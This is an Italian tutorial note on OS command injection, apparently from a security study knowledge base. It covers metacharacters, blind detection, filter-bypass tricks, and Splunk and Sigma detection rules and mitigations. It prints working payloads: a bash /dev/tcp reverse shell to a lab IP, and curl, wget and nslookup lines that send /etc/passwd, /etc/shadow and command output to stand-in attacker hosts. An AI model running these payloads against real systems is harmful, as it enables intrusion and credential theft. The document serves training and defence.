---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 6
aggiornato: 2026-07-02
stato: maturo
aliases: ["Command Injection", "OS Command Injection"]
---

# Command Injection

> **Nota etica**: praticare solo su lab autorizzati (PortSwigger Academy, DVWA, TryHackMe).

## In breve
La **Command Injection** permette di eseguire **comandi arbitrari del sistema operativo** sul server: l'app passa input non sanificato a una funzione shell (`system()`, `exec()`, `popen()`, backtick). È RCE diretta → tra le vulnerabilità web più gravi. Categoria **A03 Injection** dell'[[OWASP Top 10]] (nella bozza **2025** Injection è **A05**).

> [!note] Altre injection con la stessa radice — LDAP
> La primitiva "dato interpretato come codice" non vale solo per shell e SQL. Nella **LDAP Injection** i filtri di directory vengono costruiti concatenando input: un payload come `*)(uid=*))(|(uid=*` o `*)(|(password=*))` altera il filtro e può bypassare il bind/login. Difesa: **escaping** dei metacaratteri LDAP (`(`, `)`, `*`, `\`, NUL) secondo RFC 4515. Stesso principio anche per XPath/NoSQL injection.

## Metacaratteri shell
| Operatore | Effetto |
|---|---|
| `;` | esegue il secondo comando in ogni caso |
| `&&` / `\|\|` | esegue se il primo riesce / fallisce |
| `\|` | pipe: output del primo → input del secondo |
| `` `cmd` `` / `$(cmd)` | sostituzione: l'output entra nel comando |
| `%0a` (newline) | separatore quando `;` è filtrato |

## Esempio pratico
App che fa ping di un host:
```bash
# backend:  ping -c 4 <host>
host=192.168.1.1; whoami        # → www-data  (RCE confermata)
host=192.168.1.1 && cat /etc/passwd
host=`id`                        # sostituzione di comando
```
Da qui si punta alla shell: vedi [[Reverse Shell e Bind Shell]]:
```bash
host=1.1.1.1; bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

## Blind Command Injection
Quando l'output **non** torna in pagina, confermala per **effetto collaterale**:
```bash
# time-based: il comando ritarda la risposta
host=1.1.1.1 && sleep 10
# out-of-band (OAST): forza una richiesta verso un tuo listener (Burp Collaborator)
host=1.1.1.1; nslookup `whoami`.attacker.oast.site
# esfiltrazione via DNS/HTTP del risultato del comando
host=1.1.1.1; curl http://attacker/$(id|base64)
```
Il canale **OAST** (DNS/HTTP verso un dominio controllato) è il modo standard di provare il blind.

---

# Approfondimento operativo (livello esperto)

## Meccanismo interno
- **`shell=True` vs argv.** `system("ping -c4 "+host)` passa **una stringa** a `/bin/sh -c`, che la ri-tokenizza: i metacaratteri (`;`, `|`, `` ` ``) sono interpretati → injection. `execve("ping", ["ping","-c4",host])` passa un **array di argomenti**: `host` resta un singolo argv, la shell non interviene, niente injection. È la stessa logica strutturale del prepared statement per SQLi: separare codice (programma) e dato (argomento).
- **Argument injection (vicino di casa).** Anche con argv separati, se `host` inizia con `-` puoi iniettare **flag**: `host=-oProxyCommand=...` su `ssh`, `--use-compress-program` su `tar`, `-T` su `curl`. Non è OS command injection ma può portare a esecuzione. Difesa: anteporre `--` o validare il primo carattere.
- **Time-based perché funziona.** `sleep`/`ping -c` bloccano il processo figlio: la risposta HTTP attende il `wait()` del processo → la latenza misura la condizione, come per la SQLi time-based.

## Casi limite — Windows vs Unix
| Aspetto | Unix (`/bin/sh`) | Windows (`cmd.exe`) | PowerShell |
|---|---|---|---|
| Separatori | `;` `&` `&&` `\|` `\|\|` `\n` | `&` `&&` `\|` `\|\|` (no `;`) | `;` `\|` |
| Sostituzione | `` `cmd` `` `$(cmd)` | `%VAR%`, `FOR /F` | `$(cmd)` `&` (call) |
| Comando test | `id`, `whoami`, `uname -a` | `whoami`, `set`, `ver` | `whoami`, `$PSVersionTable` |
| OOB DNS | `nslookup x.oast.site` | `nslookup x.oast.site` | `Resolve-DnsName` |
> Su Windows `;` non separa comandi in `cmd.exe`: usa `&`. PowerShell sì.

## Bypass filtri — una tecnica per blocco
| Filtro | Bypass |
|---|---|
| **Spazi vietati** | `$IFS` (`cat${IFS}/etc/passwd`), `${IFS}`, `<` redirection (`cat</etc/passwd`), `{cat,/etc/passwd}` (brace), tab `%09` |
| **Blacklist comando (`cat`)** | quoting/glob che la shell rimuove: `c""at`, `c\at`, `/bin/c?t /etc/passwd`, `/???/c?t` |
| **Slash `/` vietato** | `${HOME:0:1}` = `/`, oppure `cd /etc; cat passwd` |
| **Punto `.` vietato** | wildcard: `cat /etc/passw?`; o costruisci con `$(printf ...)` |
| **Keyword filtrate** | concatenazione: `wh''oami`, `who$@ami`, base64: `echo d2hvYW1p\|base64 -d\|bash` |
| **`;` `&` filtrati** | newline `%0a`, oppure `$(...)`/`` `...` `` che non usano separatori |
| **Encoding lato app** | doppio URL-encode, `%250a`; se l'app decodifica due volte il payload riemerge |
> [!tip] `$IFS` e brace expansion
> `$IFS` (Internal Field Separator) vale spazio/tab/newline: ovunque serva uno spazio puoi mettere `${IFS}`. `{cmd,arg1,arg2}` espande in `cmd arg1 arg2` senza scrivere spazi. Coprono insieme la maggior parte dei filtri "no-space".

## Esfiltrazione OOB completa
```bash
# DNS: il risultato del comando diventa sottodominio (limite ~63 char/label, niente char speciali)
host=1.1.1.1; nslookup $(whoami).$(hostname).x.oast.site
# DNS con dati lunghi: encoda e spezza
host=1.1.1.1; D=$(cat /etc/passwd|base64|tr -d '\n'); nslookup ${D:0:60}.x.oast.site
# HTTP: più capiente, niente limiti label
host=1.1.1.1; curl -d "$(id;hostname;ip a)" http://attacker.tld/x
host=1.1.1.1; wget --post-data="$(cat /etc/shadow|base64)" http://attacker.tld/
```
Con [[Burp Suite]] Collaborator il dominio `*.oast` registra hit DNS e HTTP, confermando il blind anche senza esfiltrare dati.

## Walkthrough end-to-end — feature "ping" → reverse shell
1. **Trova il sink.** Campo che fa ping/lookup/converti-file/genera-PDF (sono i tipici). Inietta `;id` o `$(id)`.
2. **Conferma (blind se serve).** Niente output? `& sleep 10 &` e cronometra; oppure OAST: `;nslookup x.oast.site`.
3. **Capisci l'OS.** `;ver` (Windows) vs `;uname -a` (Unix); che shell (`$0`).
4. **Aggira i filtri** con `$IFS`/quoting se gli spazi o le keyword sono bloccati.
5. **Stabilizza una shell** verso un listener (vedi [[Reverse Shell e Bind Shell]]):
   ```bash
   host=1.1.1.1;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
   # se bash assente: nc, mkfifo, python3 -c '...', oppure scarica busybox
   ```
6. **Post-exploitation:** enumerazione, sudo -l, privesc (vedi [[Permessi Linux]]).

## OPSEC e limiti
- Ogni payload finisce **nei log** (access log col query string, eventualmente shell history del processo): un reverse shell verso un IP riconducibile brucia l'operazione. Nei test autorizzati usa IP/dominio del lab.
- `sleep` lungo è rumoroso e rallenta: usa il minimo che distingua il segnale dal rumore (`sleep 3` se la latenza base è < 1s).
- OOB DNS può fallire dietro **egress filtering**; HTTP può essere bloccato in uscita → prova entrambi i canali, e ICMP/`ping` come ultimo segnale.
- Limite difensivo: con argv-separato + allowlist + processo non privilegiato in container seccomp, la injection può non esistere o avere blast radius minimo.

## Detection engineering
**Sorgenti:** access log (metacaratteri nei parametri), **EDR/auditd**: la firma forte è un **processo web** (`apache`, `nginx`, `php-fpm`, `node`, `w3wp.exe`) che genera **processi figli shell** (`sh`, `bash`, `nc`, `nslookup`, `whoami`, `cmd.exe`, `powershell.exe`).

**Splunk (process telemetry — il segnale migliore):**
```spl
index=edr (parent_process IN ("httpd","nginx","php-fpm*","node","w3wp.exe","java"))
  process IN ("sh","bash","cmd.exe","powershell.exe","nc","ncat","nslookup","curl","wget","whoami")
| stats count by host, parent_process, process, user
```
**Regola Sigma (web child process):**
```yaml
title: Shell generata da processo web server (possibile Command Injection)
logsource: { category: process_creation }
detection:
  parent:
    ParentImage|endswith:
      - '/httpd'
      - '/nginx'
      - '/php-fpm'
      - '\w3wp.exe'
  child:
    Image|endswith: ['/sh','/bash','\cmd.exe','\powershell.exe','/nc']
  condition: parent and child
falsepositives: [ script CGI legittimi che invocano una shell ]
level: high
```
**MITRE ATT&CK:** **T1059** Command and Scripting Interpreter (.003 Windows cmd, .004 Unix shell); ingresso via **T1190**. OOB DNS = **T1071.004** (Application Layer Protocol: DNS).

## Troubleshooting (5 errori comuni)
1. **`;cmd` non fa nulla** → l'app usa argv-separato (niente shell) o filtra `;`. Prova `$(...)`/`` `...` ``, newline `%0a`, o cerca **argument injection** (`-flag`).
2. **Funziona `id` ma non la reverse shell** → `bash` o `/dev/tcp` assenti (es. Debian `dash`). Usa `nc`, `mkfifo`, `python3`, o scarica un binario.
3. **OOB non arriva** → egress filtering. Cambia canale (DNS→HTTP→ICMP); verifica che il dominio Collaborator sia raggiungibile dall'esterno.
4. **Spazi mangiati/payload spezzato** → l'app fa split sugli spazi o li filtra. Usa `${IFS}`, `{a,b}`, o redirection `<`.
5. **Doppio decoding rompe il payload** → l'app URL-decoda due volte (proxy + app): single-encode i metacaratteri o usa `%250a` per ottenere `%0a` dopo il primo giro.

## Lab
- **PortSwigger Web Academy** — [[PortSwigger Web Academy]]: percorso *OS command injection* (simple, blind con time delay, blind con OAST, blind con esfiltrazione output). Gratuiti.
- **TryHackMe** — *Command Injection* e la sezione relativa di *OWASP Top 10*.
- **DVWA** — modulo *Command Injection* (low→high) per esercitare i bypass dei filtri (`$IFS`, quoting, newline).
- **HackTheBox** — macchine con feature "ping/lookup" iniettabili (es. challenge web "under construction").

## Domande da colloquio
**D: Perché `shell=False`/argv separato elimina la command injection?**
R: Passando un array di argomenti a `execve`, l'input resta un singolo `argv` e nessuna shell ri-tokenizza i metacaratteri. La shell — che interpreta `;`, `|`, `` ` `` — non viene mai invocata, quindi non c'è injection.

**D: Hai una command injection blind. Come la confermi senza output?**
R: Per effetto collaterale: time-based (`sleep`/`ping -c` e cronometro) o out-of-band (`nslookup`/`curl` verso un Collaborator). L'OOB è preferibile perché conferma esecuzione *e* può esfiltrare il risultato del comando.

**D: L'app filtra gli spazi. Come esegui `cat /etc/passwd`?**
R: `cat${IFS}/etc/passwd`, oppure `{cat,/etc/passwd}` (brace expansion), oppure redirection `cat</etc/passwd`. `$IFS` e le brace sostituiscono lo spazio senza scriverlo.

**D: Differenza tra command injection e argument injection?**
R: La command injection inserisce **nuovi comandi** sfruttando la shell (metacaratteri). L'argument injection lavora con argv-separato (niente shell): inietta **flag/opzioni** nel comando esistente (es. `-o`, `--use-compress-program`), che possono comunque portare a esecuzione o lettura file.

## Mitigazione (priorità)
1. **Evitare la shell**: usare API native con argomenti separati — `subprocess.run([...], shell=False)` in Python, `execFile` in Node. Niente concatenazione di stringhe.
2. **Allowlist** rigida dell'input (es. solo cifre e punti per un IP); mai blacklist di caratteri.
3. **Minimo privilegio**: il processo web non gira come root; container/seccomp per limitare il blast radius (vedi [[Permessi Linux]]).
4. **WAF** come strato extra, **non** come fix.

## Collegamenti
- [[OWASP Top 10]]
- [[SQL Injection]]
- [[Server-Side Template Injection (SSTI)]] — altra injection server-side che porta a RCE
- [[File Inclusion (LFI e RFI)]]
- [[Reverse Shell e Bind Shell]]
- [[Permessi Linux]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti
- PortSwigger — OS Command Injection: https://portswigger.net/web-security/os-command-injection
- OWASP — Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- OWASP — OS Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- HackTricks — Command Injection (bypass filtri, $IFS): https://book.hacktricks.xyz/pentesting-web/command-injection
- PayloadsAllTheThings — Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- MITRE ATT&CK — T1059 Command and Scripting Interpreter: https://attack.mitre.org/techniques/T1059/
